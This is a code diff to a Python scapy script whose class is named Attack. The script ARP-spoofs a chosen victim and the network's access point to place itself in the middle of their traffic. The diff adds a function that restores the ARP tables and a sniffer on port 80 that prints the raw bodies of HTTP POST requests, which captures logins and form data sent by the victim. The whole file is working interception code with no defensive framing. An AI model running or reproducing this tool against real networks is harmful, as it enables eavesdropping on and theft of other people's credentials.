@@ -2,6 +2,7 @@
 import netifaces as ni
 import os
 import scapy.all as scapy
+from scapy.layers.http import HTTPRequest
 import time
 
 class Attack():
@@ -28,24 +29,39 @@ class Attack():
     def spoof(self, target_ip, spoof_ip): 
         target_mac = self.ip_mac[target_ip]
         packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-        scapy.send(packet)
+        scapy.send(packet, verbose=0)
+
+    def restore(self, dest_ip, src_ip):
+        dest_mac = self.ip_mac[dest_ip]
+        src_mac = self.ip_mac[src_ip]
+        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
+        scapy.send(packet, count=4, verbose=0)
 
     def arp_spoofing(self):
         while 1:
-            attack.spoof(self.victim, self.ap)
-            attack.spoof(self.ap, self.victim)
-            time.sleep(1)
+            self.spoof(self.victim, self.ap)
+            self.spoof(self.ap, self.victim)
+            time.sleep(2)
 
     def ret_arp_spoofing(self):
         while 1:
-            attack.spoof(attack.victim, self.victim)
-            attack.spoof(attack.ap, attack.ap)
-            time.sleep(1)
+            self.restore(self.victim, self.ap)
+            self.restore(self.ap, self.victim)
+            time.sleep(2)
+    
+    def sniff_packets(self):
+        scapy.sniff(filter="port 80", prn=self.process_packet, iface=self.interfaces[1], store=False)
+
+    def process_packet(self, packet):
+        print('get', ' ', packet.haslayer(HTTPRequest))
+        if packet.haslayer(HTTPRequest) and packet[HTTPRequest].Method.decode() == 'POST':
+            print(f"{packet[scapy.Raw].load}\n")
+        scapy.send(packet, verbose=0)
+        print('done\n')
 
 attack = Attack()
 attack.get_ip()
 attack.get_mac(attack.network[1])
-print(attack.ip_list, '\n', attack.ip_mac, '\n', attack.network)
-attack.ret_arp_spoofing()
-
-
+print(attack.interfaces, attack.ip_list, '\n', attack.ip_mac, '\n', attack.network)
+#attack.arp_spoofing()
+attack.sniff_packets()
